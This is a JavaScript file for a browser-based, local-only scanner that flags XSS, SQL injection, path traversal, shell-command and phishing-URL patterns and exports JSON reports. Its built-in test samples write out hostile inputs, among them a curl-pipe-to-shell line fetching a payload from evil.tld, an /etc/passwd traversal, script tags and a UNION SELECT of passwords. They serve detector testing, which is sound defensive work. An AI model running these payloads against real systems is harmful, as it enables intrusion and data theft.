// app.js
(() => {
  "use strict";

  // ---------- DOM ----------
  const $ = (id) => document.getElementById(id);

  const elInput = $("input");
  const btnRun = $("btnRun");
  const btnExport = $("btnExport");
  const btnClear = $("btnClear");
  const btnLoadA = $("btnLoadA");
  const btnLoadB = $("btnLoadB");

  const verdictBanner = $("verdictBanner");
  const peakSeverity = $("peakSeverity");
  const peakConfidence = $("peakConfidence");
  const signalsEl = $("signals");

  const cntScans = $("cntScans");
  const cntAllow = $("cntAllow");
  const cntWarn = $("cntWarn");
  const cntBlock = $("cntBlock");

  const reasonsEl = $("reasons");
  const stepsEl = $("steps");

  const tbody = $("tbody");

  // Info modal
  const btnInfo = $("btnInfo");
  const infoModal = $("infoModal");
  const btnInfoClose = $("btnInfoClose");
  const btnInfoCloseX = $("btnInfoCloseX");

  // ---------- STATE ----------
  let lastReport = null;

  // ---------- UTIL ----------
  const clamp = (n, a, b) => Math.max(a, Math.min(b, n));
  const pct = (n) => `${Math.round(clamp(n, 0, 100))}%`;

  function safeText(s) {
    return (s ?? "").toString();
  }

  function isLikelyURL(s) {
    // Accept raw URLs or things that look like domain/path
    const t = s.trim();
    if (!t) return false;
    if (/^https?:\/\//i.test(t)) return true;
    if (/^[a-z0-9.-]+\.[a-z]{2,}(\/|$)/i.test(t)) return true;
    return false;
  }

  function normalizeURL(s) {
    let t = s.trim();
    if (!/^https?:\/\//i.test(t)) t = "https://" + t;
    try {
      return new URL(t);
    } catch {
      return null;
    }
  }

  function shannonEntropy(str) {
    const s = str || "";
    if (!s.length) return 0;
    const freq = new Map();
    for (const ch of s) freq.set(ch, (freq.get(ch) || 0) + 1);
    let ent = 0;
    for (const [, c] of freq) {
      const p = c / s.length;
      ent -= p * Math.log2(p);
    }
    return ent; // typical 0..~6+
  }

  function addListItems(ul, items) {
    ul.innerHTML = "";
    for (const it of items) {
      const li = document.createElement("li");
      li.textContent = it;
      ul.appendChild(li);
    }
  }

  function setVerdictUI(verdict) {
    verdictBanner.classList.remove("verdict-secure", "verdict-suspicious", "verdict-danger");
    if (verdict === "SECURE") verdictBanner.classList.add("verdict-secure");
    else if (verdict === "SUSPICIOUS") verdictBanner.classList.add("verdict-suspicious");
    else verdictBanner.classList.add("verdict-danger");

    verdictBanner.querySelector(".verdictLabel").textContent = verdict;
  }

  function renderSignals(signalCounts) {
    signalsEl.innerHTML = "";
    const entries = Object.entries(signalCounts).filter(([, v]) => v > 0);

    if (!entries.length) {
      const chip = document.createElement("div");
      chip.className = "chip";
      chip.innerHTML = `<span class="dot good"></span><span>No signals</span>`;
      signalsEl.appendChild(chip);
      return;
    }

    // Sort by count desc
    entries.sort((a, b) => b[1] - a[1]);

    for (const [name, count] of entries) {
      const sev = name.startsWith("HIGH:") ? "bad" : name.startsWith("MID:") ? "warn" : "good";
      const chip = document.createElement("div");
      chip.className = "chip";
      chip.innerHTML = `<span class="dot ${sev}"></span><span>${name.replace(/^HIGH:|^MID:|^LOW:/, "")}</span><span class="muted">×${count}</span>`;
      signalsEl.appendChild(chip);
    }
  }

  function badge(decision) {
    const cls = decision === "ALLOW" ? "allow" : decision === "WARN" ? "warn" : "block";
    return `<span class="badge ${cls}">${decision}</span>`;
  }

  function clearTable() {
    tbody.innerHTML = `
      <tr class="emptyRow">
        <td colspan="6">No results yet. Paste inputs and click Execute Scan.</td>
      </tr>`;
  }

  // ---------- SCORING ENGINE ----------
  function detectSignals(line) {
    const raw = line;
    const s = line.trim();
    const lower = s.toLowerCase();
    const signals = [];

    // Obfuscation / encoding patterns
    if (/%[0-9a-f]{2}/i.test(s)) signals.push(["LOW:URL_ENCODED", 10, 45]);
    if (/\\x[0-9a-f]{2}/i.test(s) || /\\u[0-9a-f]{4}/i.test(s)) signals.push(["MID:HEX_UNICODE_ESCAPES", 25, 60]);
    if (/base64/i.test(s) || /\b[a-z0-9+/]{40,}={0,2}\b/i.test(s)) signals.push(["MID:BASE64_LIKE", 25, 55]);

    // XSS
    if (/<script\b/i.test(s) || /onerror\s*=/i.test(s) || /onload\s*=/i.test(s)) signals.push(["HIGH:XSS_SCRIPT", 55, 85]);
    if (/javascript:/i.test(s)) signals.push(["HIGH:JAVASCRIPT_SCHEME", 60, 85]);

    // SQLi
    if (/\bunion\b\s+\bselect\b/i.test(s)) signals.push(["HIGH:SQL_UNION", 55, 85]);
    if (/\bor\b\s+1=1\b/i.test(s) || /'?\s*or\s*'?\d+'?\s*=\s*'?\d+'?/i.test(s)) signals.push(["HIGH:SQL_TAUTOLOGY", 50, 80]);
    if (/\bdrop\b\s+\btable\b/i.test(s)) signals.push(["HIGH:SQL_DROP", 60, 85]);

    // CMD / PowerShell
    if (/\b(powershell|cmd\.exe|bash|sh)\b/i.test(s)) signals.push(["HIGH:CMD_SHELL", 55, 80]);
    if (/\b(wget|curl)\b/i.test(s)) signals.push(["MID:DOWNLOAD_TOOL", 35, 70]);

    // LFI / path traversal
    if (/\.\.\/\.\.\//.test(s) || /(\.\.\/){2,}/.test(s)) signals.push(["HIGH:PATH_TRAVERSAL", 55, 80]);
    if (/\/etc\/passwd/i.test(s)) signals.push(["HIGH:LFI_ETC_PASSWD", 60, 85]);
    if (/\bwindows\/system32\b/i.test(s)) signals.push(["MID:WINDOWS_SYSTEM32", 35, 70]);

    // URL-based signals
    let urlObj = null;
    if (isLikelyURL(s)) {
      urlObj = normalizeURL(s);
      if (urlObj) {
        const host = urlObj.hostname || "";
        const path = urlObj.pathname || "";
        const qs = urlObj.search || "";

        // redirect parameters often used in phishing
        if (/(redirect|redir|return|next|url|continue)=/i.test(qs)) signals.push(["MID:REDIRECT_PARAM", 35, 75]);

        // auth endpoints (phishing risk if combined with other cues)
        if (/(login|signin|authorize|oauth|auth)/i.test(path)) signals.push(["MID:AUTH_ENDPOINT", 30, 70]);

        // punycode homograph (xn--)
        if (/xn--/i.test(host)) signals.push(["HIGH:PUNYCODE_HOST", 55, 85]);

        // suspicious TLD patterns (low weight, avoid false positives)
        if (/\.(zip|mov|top|cam|click)$/i.test(host)) signals.push(["LOW:SUSPICIOUS_TLD", 10, 55]);

        // IP literal
        if (/^\d{1,3}(\.\d{1,3}){3}$/.test(host)) signals.push(["MID:IP_HOST", 25, 65]);
      }
    }

    // Very high entropy strings can indicate obfuscation/token dump
    const ent = shannonEntropy(s);
    if (s.length >= 40 && ent >= 4.5) signals.push(["MID:HIGH_ENTROPY", 25, 65]);

    // Classify type
    let type = "Data";
    if (urlObj) type = "URL";
    else if (/^<script\b/i.test(s) || /javascript:/i.test(s)) type = "Exploit";
    else if (/\bselect\b|\bunion\b|\bdrop\b/i.test(lower)) type = "Exploit";
    else if (/\.\.\//.test(s) || /\/etc\/passwd/i.test(s)) type = "Exploit";

    // Aggregate severity/confidence
    let sev = 0;
    let conf = 50; // baseline

    for (const [, wSev, wConf] of signals) {
      sev += wSev;
      conf = Math.max(conf, wConf);
    }

    // Normalize severity into 0..100 (soft cap)
    sev = clamp(sev, 0, 100);

    // Decision thresholds
    let decision = "ALLOW";
    if (sev >= 70) decision = "BLOCK";
    else if (sev >= 30) decision = "WARN";

    // Confidence calibration: higher severity => higher confidence, but clamp
    conf = clamp(conf + Math.floor(sev * 0.15), 0, 100);

    // Build reasons/steps (system-level later uses top reasons)
    const reasons = [];
    const steps = [];

    const names = signals.map((x) => x[0]);
    if (names.some(n => n.includes("REDIRECT_PARAM"))) reasons.push("Potential open-redirect parameter present.");
    if (names.some(n => n.includes("AUTH_ENDPOINT"))) reasons.push("Authentication-related endpoint detected.");
    if (names.some(n => n.includes("PUNYCODE_HOST"))) reasons.push("Punycode host (xn--) indicates homograph/phishing risk.");
    if (names.some(n => n.includes("SQL_"))) reasons.push("SQL injection pattern detected.");
    if (names.some(n => n.includes("XSS_") || n.includes("JAVASCRIPT_SCHEME"))) reasons.push("XSS / script execution pattern detected.");
    if (names.some(n => n.includes("PATH_TRAVERSAL") || n.includes("LFI_"))) reasons.push("Path traversal / LFI pattern detected.");
    if (names.some(n => n.includes("CMD_") || n.includes("DOWNLOAD_TOOL"))) reasons.push("Command execution / payload download indicators detected.");
    if (names.some(n => n.includes("HIGH_ENTROPY") || n.includes("BASE64_LIKE") || n.includes("HEX_UNICODE_ESCAPES") || n.includes("URL_ENCODED")))
      reasons.push("Obfuscation / encoding indicators detected.");

    if (!reasons.length) reasons.push("No immediate threat detected. Routine monitoring only.");

    // Steps depend on decision
    if (decision === "ALLOW") {
      steps.push("Proceed normally. Keep logs for traceability.");
      steps.push("If context is unknown, verify source before acting.");
    } else if (decision === "WARN") {
      steps.push("Proceed with caution: verify context and source.");
      steps.push("If URL: open in isolated environment and verify domain carefully.");
      steps.push("Inspect logs for related activity and unusual redirects.");
    } else {
      steps.push("Block this input in the pipeline.");
      steps.push("If URL: do NOT open. Isolate and verify domain ownership.");
      steps.push("Escalate with exported JSON report to ticket/SOC workflow.");
    }

    return {
      raw,
      type,
      decision,
      severity: sev,
      confidence: conf,
      entropy: ent,
      signalNames: names,
      reasons,
      steps,
    };
  }

  function summarizeSystem(findings) {
    const counts = { scans: findings.length, allow: 0, warn: 0, block: 0 };
    const signalCounts = {};

    let peakSev = 0;
    let peakConf = 0;

    for (const f of findings) {
      if (f.decision === "ALLOW") counts.allow++;
      else if (f.decision === "WARN") counts.warn++;
      else counts.block++;

      peakSev = Math.max(peakSev, f.severity);
      peakConf = Math.max(peakConf, f.confidence);

      for (const s of f.signalNames) {
        signalCounts[s] = (signalCounts[s] || 0) + 1;
      }
    }

    // System verdict
    let verdict = "SECURE";
    if (counts.block > 0 || peakSev >= 80) verdict = "DANGER";
    else if (counts.warn > 0 || peakSev >= 30) verdict = "SUSPICIOUS";

    // System reasons/steps:
    // - pick top reasons from the most severe finding(s)
    const sorted = [...findings].sort((a, b) => b.severity - a.severity);
    const top = sorted[0] || null;

    const sysReasons = top ? top.reasons.slice(0, 4) : ["No immediate threat detected. Routine monitoring only."];
    const sysSteps = top ? top.steps.slice(0, 4) : ["Proceed normally. Keep logs for traceability."];

    return {
      verdict,
      peakSev,
      peakConf,
      counts,
      signalCounts,
      sysReasons,
      sysSteps,
    };
  }

  function render(findings) {
    // Table
    tbody.innerHTML = "";
    if (!findings.length) {
      clearTable();
      return;
    }

    for (const f of findings) {
      const tr = document.createElement("tr");

      const tdInput = document.createElement("td");
      tdInput.textContent = f.raw.length > 160 ? f.raw.slice(0, 160) + "…" : f.raw;

      const tdType = document.createElement("td");
      tdType.textContent = f.type;

      const tdDecision = document.createElement("td");
      tdDecision.innerHTML = badge(f.decision);

      const tdSev = document.createElement("td");
      tdSev.textContent = pct(f.severity);

      const tdConf = document.createElement("td");
      tdConf.textContent = pct(f.confidence);

      const tdEnt = document.createElement("td");
      tdEnt.textContent = (Math.round(f.entropy * 100) / 100).toFixed(2);

      tr.appendChild(tdInput);
      tr.appendChild(tdType);
      tr.appendChild(tdDecision);
      tr.appendChild(tdSev);
      tr.appendChild(tdConf);
      tr.appendChild(tdEnt);

      tbody.appendChild(tr);
    }

    const sys = summarizeSystem(findings);

    setVerdictUI(sys.verdict);
    peakSeverity.textContent = pct(sys.peakSev);
    peakConfidence.textContent = pct(sys.peakConf);

    cntScans.textContent = String(sys.counts.scans);
    cntAllow.textContent = String(sys.counts.allow);
    cntWarn.textContent = String(sys.counts.warn);
    cntBlock.textContent = String(sys.counts.block);

    renderSignals(sys.signalCounts);
    addListItems(reasonsEl, sys.sysReasons);
    addListItems(stepsEl, sys.sysSteps);

    lastReport = {
      generatedAt: new Date().toISOString(),
      localOnly: true,
      system: {
        verdict: sys.verdict,
        peakSeverity: sys.peakSev,
        peakConfidence: sys.peakConf,
        counts: sys.counts,
        signalCounts: sys.signalCounts,
        primaryReasons: sys.sysReasons,
        remediationSteps: sys.sysSteps,
      },
      findings: findings.map((f) => ({
        input: f.raw,
        type: f.type,
        decision: f.decision,
        severity: f.severity,
        confidence: f.confidence,
        entropy: Math.round(f.entropy * 100) / 100,
        signals: f.signalNames.map((n) => n.replace(/^HIGH:|^MID:|^LOW:/, "")),
        reasons: f.reasons,
        steps: f.steps,
      })),
    };
  }

  // ---------- EXPORT ----------
  function downloadJSON(obj) {
    const blob = new Blob([JSON.stringify(obj, null, 2)], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `validoon_report_${Date.now()}.json`;
    document.body.appendChild(a);
    a.click();
    a.remove();
    URL.revokeObjectURL(url);
  }

  // ---------- TESTS ----------
  const TEST_A = [
    "https://example.com/",
    "hello world",
    "https://login.microsoftonline.com/common/oauth2/authorize?redirect_uri=https://evil.com",
    "https://accounts.google.com/signin/oauth/authorize?redirect_url=https://xn--g00gle-qmc.com",
    "<script>alert(1)</script>",
    "SELECT * FROM users WHERE 1=1 OR 1=1",
    "../../../../../etc/passwd",
    "powershell -enc SQBFAFgA",
  ].join("\n");

  const TEST_B = [
    "https://example.com/login?next=https://evil.tld",
    "javascript:alert(1)",
    "UNION SELECT username,password FROM users",
    "curl http://evil.tld/payload.sh | sh",
    "xn--pple-43d.com/login",
    "normal_entry: user_id=2 action=report",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "GET /../../../../windows/system32/drivers/etc/hosts",
  ].join("\n");

  // ---------- INFO MODAL ----------
  function openInfo() {
    infoModal.classList.add("open");
    infoModal.setAttribute("aria-hidden", "false");
  }
  function closeInfo() {
    infoModal.classList.remove("open");
    infoModal.setAttribute("aria-hidden", "true");
  }

  // ---------- EVENTS ----------
  btnRun.addEventListener("click", () => {
    const lines = safeText(elInput.value)
      .split(/\r?\n/)
      .map((x) => x.trim())
      .filter((x) => x.length > 0);

    const findings = lines.map(detectSignals);
    render(findings);
  });

  btnExport.addEventListener("click", () => {
    if (!lastReport) {
      // Build an empty report if user exports before running
      lastReport = {
        generatedAt: new Date().toISOString(),
        localOnly: true,
        system: {
          verdict: "SECURE",
          peakSeverity: 0,
          peakConfidence: 0,
          counts: { scans: 0, allow: 0, warn: 0, block: 0 },
          signalCounts: {},
          primaryReasons: ["No results yet. Paste inputs and click Execute Scan."],
          remediationSteps: ["Run a scan first to generate a report."],
        },
        findings: [],
      };
    }
    downloadJSON(lastReport);
  });

  btnClear.addEventListener("click", () => {
    elInput.value = "";
    lastReport = null;

    setVerdictUI("SECURE");
    peakSeverity.textContent = "0%";
    peakConfidence.textContent = "0%";

    cntScans.textContent = "0";
    cntAllow.textContent = "0";
    cntWarn.textContent = "0";
    cntBlock.textContent = "0";

    renderSignals({});
    addListItems(reasonsEl, ["No results yet. Paste inputs and click Execute Scan."]);
    addListItems(stepsEl, ["Reset complete. Paste inputs and scan."]);
    clearTable();
  });

  btnLoadA.addEventListener("click", () => {
    elInput.value = TEST_A;
  });

  btnLoadB.addEventListener("click", () => {
    elInput.value = TEST_B;
  });

  // Info bindings (fix: must exist + must work)
  btnInfo.addEventListener("click", openInfo);
  btnInfoClose.addEventListener("click", closeInfo);
  btnInfoCloseX.addEventListener("click", closeInfo);
  infoModal.addEventListener("click", (e) => {
    if (e.target === infoModal) closeInfo();
  });
  document.addEventListener("keydown", (e) => {
    if (e.key === "Escape" && infoModal.classList.contains("open")) closeInfo();
  });

  // ---------- INIT ----------
  // Default UI state
  renderSignals({});
  addListItems(reasonsEl, ["No results yet. Paste inputs and click Execute Scan."]);
  addListItems(stepsEl, ["Local-only. No uploads. Use Test A/B to validate."]);
  clearTable();
})();
